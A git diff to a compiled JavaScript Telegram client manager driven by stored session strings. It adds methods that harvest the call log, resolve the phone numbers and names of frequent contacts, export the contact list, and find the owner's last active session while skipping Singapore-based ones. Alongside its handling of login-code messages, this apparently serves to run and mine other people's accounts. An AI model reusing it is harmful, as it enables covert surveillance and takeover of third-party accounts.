@@ -11,6 +11,7 @@ const utils_1 = require("../../utils");
 const Helpers_1 = require("telegram/Helpers");
 const Logger_1 = require("telegram/extensions/Logger");
 const IMap_1 = require("../../IMap/IMap");
+const big_integer_1 = require("big-integer");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         this.session = new sessions_1.StringSession(sessionString);
@@ -194,6 +195,73 @@ class TelegramManager {
         }
         return chatData;
     }
+    async getCallLog() {
+        const result = await this.client.invoke(new tl_1.Api.messages.Search({
+            peer: new tl_1.Api.InputPeerEmpty(),
+            q: '',
+            filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
+            minDate: 0,
+            maxDate: 0,
+            offsetId: 0,
+            addOffset: 0,
+            limit: 200,
+            maxId: 0,
+            minId: 0,
+            hash: (0, big_integer_1.default)(0),
+        }));
+        const callLogs = result.messages.filter((message) => message.action instanceof tl_1.Api.MessageActionPhoneCall);
+        const filteredResults = {
+            outgoing: 0,
+            incoming: 0,
+            video: 0,
+            chatCallCounts: {},
+            totalCalls: 0
+        };
+        for (const log of callLogs) {
+            filteredResults.totalCalls++;
+            const logAction = log.action;
+            const callInfo = {
+                callId: logAction.callId.toString(),
+                duration: logAction.duration,
+                video: logAction.video,
+                timestamp: log.date
+            };
+            if (log.out) {
+                filteredResults.outgoing++;
+            }
+            else {
+                filteredResults.incoming++;
+            }
+            if (logAction.video) {
+                filteredResults.video++;
+            }
+            const chatId = log.peerId.userId.toString();
+            if (!filteredResults.chatCallCounts[chatId]) {
+                const ent = await this.client.getEntity(chatId);
+                filteredResults.chatCallCounts[chatId] = {
+                    phone: ent.phone,
+                    username: ent.username,
+                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
+                    count: 0
+                };
+            }
+            filteredResults.chatCallCounts[chatId].count++;
+        }
+        const filteredChatCallCounts = Object.entries(filteredResults.chatCallCounts)
+            .filter(([chatId, details]) => details["count"] > 5)
+            .map(([chatId, details]) => ({
+            ...details,
+            chatId,
+        }));
+        console.log({
+            ...filteredResults,
+            chatCallCounts: filteredChatCallCounts
+        });
+        return {
+            ...filteredResults,
+            chatCallCounts: filteredChatCallCounts
+        };
+    }
     async handleEvents(event) {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
@@ -287,6 +355,24 @@ class TelegramManager {
         catch (error) {
             throw error;
         }
+    }
+    async getLastActiveTime() {
+        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
+        let latest = 0;
+        result.authorizations.map((auth) => {
+            if (!auth.country.toLowerCase().includes('singapore')) {
+                if (latest < auth.dateActive) {
+                    latest = auth.dateActive;
+                }
+            }
+        });
+        return latest;
+    }
+    async getContacts() {
+        const exportedContacts = await this.client.invoke(new tl_1.Api.contacts.GetContacts({
+            hash: (0, big_integer_1.default)(0)
+        }));
+        return exportedContacts;
     }
     async updateUsername(baseUsername) {
         let newUserName = '';
